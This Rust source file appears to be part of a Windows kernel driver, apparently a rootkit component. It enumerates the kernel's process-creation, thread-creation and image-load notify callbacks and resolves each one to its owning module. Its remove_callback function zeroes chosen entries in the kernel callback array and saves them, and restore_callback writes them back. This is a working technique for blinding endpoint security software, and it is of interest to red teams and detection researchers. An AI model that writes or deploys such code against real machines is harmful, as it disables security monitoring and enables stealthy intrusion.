use {
    core::mem::size_of,
    ntapi::ntldr::LDR_DATA_TABLE_ENTRY,
    shared::structs::{CallbackInfoInput, CallbackInfoOutput},
    wdk_sys::{
        NTSTATUS, STATUS_SUCCESS, STATUS_UNSUCCESSFUL
    },
    crate::{
        callback::{
            find_callback::{find_callback_address, CallbackResult}, 
            CallbackList, INFO_CALLBACK_RESTAURE
        }, 
        internals::structs::CallbackRestaure, utils::return_module
    },
};

/// Structure representing the Callback.
pub struct Callback;

/// Implement a feature for the callback PsSetCreateProcessNotifyRoutine / PsSetCreateThreadNotifyRoutine / PsSetLoadImageNotifyRoutine.
impl CallbackList for Callback {
    unsafe fn restore_callback(target_callback: *mut CallbackInfoInput) -> NTSTATUS {
        let mut callbacks = INFO_CALLBACK_RESTAURE.lock();
        let type_ = (*target_callback).callback;
        let index = (*target_callback).index;

        if let Some(index) = callbacks.iter().position(|c| c.callback == type_ && c.index == index) {
            let address = match find_callback_address(&(*target_callback).callback) {
                Some(CallbackResult::PsCreate(addr)) => addr,
                _ => return STATUS_UNSUCCESSFUL,
            };

            let addr = address.offset((callbacks[index].index * 8) as isize);
            *(addr as *mut u64) = callbacks[index].address;
            callbacks.remove(index);
        } else {
            log::error!("Callback not found for type {:?} at index {}", type_, index);
            return STATUS_UNSUCCESSFUL;
        }

        STATUS_SUCCESS
    }

    unsafe fn remove_callback(target_callback: *mut CallbackInfoInput) -> NTSTATUS {
        let address = match find_callback_address(&(*target_callback).callback) {
            Some(CallbackResult::PsCreate(addr)) => addr,
            _ => return STATUS_UNSUCCESSFUL,
        };

        let index = (*target_callback).index as isize;
        let addr = address.offset(index * 8);
        let callback = CallbackRestaure {
            index: (*target_callback).index,
            callback: (*target_callback).callback,
            address: *(addr as *mut u64),
            ..Default::default()
        };

        let mut callback_info = INFO_CALLBACK_RESTAURE.lock();
        callback_info.push(callback);

        *(addr as *mut u64) = 0;

        log::info!("Callback removed at index {}", index);

        STATUS_SUCCESS
    }

    unsafe fn enumerate_callback(target_callback: *mut CallbackInfoInput, callback_info: *mut CallbackInfoOutput, information: &mut usize) -> Result<(), NTSTATUS> {
        let address = match find_callback_address(&(*target_callback).callback) {
            Some(CallbackResult::PsCreate(addr)) => addr,
            _ => return Err(STATUS_UNSUCCESSFUL),
        };

        let (mut ldr_data, module_count) = return_module().ok_or(STATUS_UNSUCCESSFUL)?;
        let start_entry = ldr_data;

        for i in 0..64 {
            let addr = address.cast::<u8>().offset(i * 8);
            let callback = *(addr as *const u64);

            if callback == 0 {
                continue;
            }

            // Iterate over the loaded modules
            for _ in 0..module_count {
                let start_address = (*ldr_data).DllBase;
                let image_size = (*ldr_data).SizeOfImage;
                let end_address = start_address as u64 + image_size as u64;
                let raw_pointer = *((callback & 0xfffffffffffffff8) as *const u64);
    
                if raw_pointer > start_address as u64 && raw_pointer < end_address {
                    let buffer = core::slice::from_raw_parts(
                        (*ldr_data).BaseDllName.Buffer,
                        ((*ldr_data).BaseDllName.Length / 2) as usize,
                    );
    
                    // Module name
                    let name = &mut (*callback_info.offset(i)).name[..buffer.len()];
                    core::ptr::copy_nonoverlapping(buffer.as_ptr(), name.as_mut_ptr(), buffer.len());
            
                    // Module address
                    (*callback_info.offset(i)).address = raw_pointer as usize;

                    // Module index
                    (*callback_info.offset(i)).index = i as u8;
            
                    *information += size_of::<CallbackInfoOutput>();
                    break;
                }

                // Go to the next module in the list
                ldr_data = (*ldr_data).InLoadOrderLinks.Flink as *mut LDR_DATA_TABLE_ENTRY;
            }

            // Reset ldr_data for next callback
            ldr_data = start_entry;
        }

        Ok(())
    }
    
    unsafe fn enumerate_removed_callback(target_callback: *mut CallbackInfoInput, callback_info: *mut CallbackInfoOutput, information: &mut usize) -> Result<(), NTSTATUS> {
        let callbacks = INFO_CALLBACK_RESTAURE.lock();
        let (mut ldr_data, module_count) = return_module().ok_or(STATUS_UNSUCCESSFUL)?;
        let start_entry = ldr_data;

        for (i, callback) in callbacks.iter().enumerate() {
            for _ in 0..module_count {
                let start_address = (*ldr_data).DllBase;
                let image_size = (*ldr_data).SizeOfImage;
                let end_address = start_address as u64 + image_size as u64;
                let raw_pointer = *((callback.address & 0xfffffffffffffff8) as *const u64);

                if raw_pointer > start_address as u64 && raw_pointer < end_address {
                    let buffer = core::slice::from_raw_parts(
                        (*ldr_data).BaseDllName.Buffer,
                        ((*ldr_data).BaseDllName.Length / 2) as usize,
                    );
                    
                    // Module name
                    let name = &mut (*callback_info.offset(i as isize)).name[..buffer.len()];
                    core::ptr::copy_nonoverlapping(buffer.as_ptr(), name.as_mut_ptr(), buffer.len());
            
                    // Module address
                    (*callback_info.offset(i as isize)).address = raw_pointer as usize;
        
                    // Module index
                    (*callback_info.offset(i as isize)).index = callback.index as u8;
        
                    *information += size_of::<CallbackInfoOutput>();
                    break;
                }         

                // Go to the next module in the list
                ldr_data = (*ldr_data).InLoadOrderLinks.Flink as *mut LDR_DATA_TABLE_ENTRY;
            }

            // Reset ldr_data for next callback
            ldr_data = start_entry;
        }

        Ok(())
    }
}